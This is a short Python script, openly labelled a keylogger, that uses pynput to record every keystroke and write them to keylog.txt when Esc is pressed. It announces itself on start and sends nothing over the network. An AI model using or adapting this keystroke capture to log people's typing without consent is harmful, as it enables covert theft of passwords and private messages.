from pynput import keyboard

# Global variable to store the pressed keys
logged_keys = []

# Function to handle key press events
def on_press(key):
    try:
        # Convert the key to a string and append to the list
        logged_keys.append(key.char)
    except AttributeError:
        # If the key is a special key, append it directly
        logged_keys.append(str(key))

# Function to handle key release events
def on_release(key):
    # If the key is the escape key, stop the listener
    if key == keyboard.Key.esc:
        return False

# Main function
def main():
    print("Keylogger started. Press 'Esc' to stop.")

    # Start the keyboard listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # Write the logged keys to a file
    with open("keylog.txt", "w") as f:
        f.write("".join(logged_keys))

if __name__ == "__main__":
    main()